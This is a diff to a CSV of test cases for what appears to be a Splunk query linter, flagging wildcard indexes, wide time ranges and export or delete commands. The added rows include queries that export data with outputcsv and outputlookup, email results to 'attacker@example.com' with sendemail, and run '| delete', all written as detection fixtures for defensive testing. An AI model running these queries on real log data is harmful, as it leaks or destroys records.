@@ -5,7 +5,7 @@ wildcard_idx_003,wildcard_index,1,index  =  *,extra whitespace
 wildcard_idx_004,wildcard_index,1,INDEX=*,uppercase — (?i)
 wildcard_idx_005,wildcard_index,0,index=_audit,
 wildcard_idx_006,wildcard_index,0,| stats count by index,no index= clause
-wildcard_idx_007,wildcard_index,1,"where index=""*""",where with quoted star — currently flags
+wildcard_idx_007,wildcard_index,0,"where index=""*""",where-clause with quoted star — regex requires whitespace or end-of-token after =, so quoted-star is NOT flagged (deliberate)
 wildcard_idx_008,wildcard_index,0,sourcetype=index_log foo,no index= clause
 len_raw_001,len_raw,1,eval r = len(_raw),
 len_raw_002,len_raw,1,| eval r=LEN(_raw),uppercase
@@ -34,3 +34,13 @@ wide_time_007,overly_wide_time,0,earliest=-7d,
 wide_time_008,overly_wide_time,0,earliest=-1d,
 wide_time_009,overly_wide_time,0,earliest=-5w,KNOWN_GAP: 5w is >30d but regex requires 2+ digits before w. v1.1 TODO.
 wide_time_010,overly_wide_time,0,earliest=-9d,KNOWN_GAP: single-digit days >7 not caught. v1.1 TODO.
+export_or_delete_001,export_or_delete,1,index=foo | outputcsv leak.csv,outputcsv to file
+export_or_delete_002,export_or_delete,1,index=_audit | outputlookup users.csv,outputlookup write
+export_or_delete_003,export_or_delete,1,index=foo | collect index=summary,collect into summary index
+export_or_delete_004,export_or_delete,1,index=foo | sendemail to=attacker@example.com,sendemail
+export_or_delete_005,export_or_delete,1,index=foo | delete,delete command
+export_or_delete_006,export_or_delete,1,index=foo |outputcsv x,no whitespace after pipe
+export_or_delete_007,export_or_delete,1,index=foo | OUTPUTCSV x,uppercase — (?i)
+export_or_delete_008,export_or_delete,0,index=foo outputcsv_field=1,bareword in event text — no pipe
+export_or_delete_009,export_or_delete,0,index=foo | stats count,benign aggregation
+export_or_delete_010,export_or_delete,0,search delete_marker=true,'delete' as field value not command
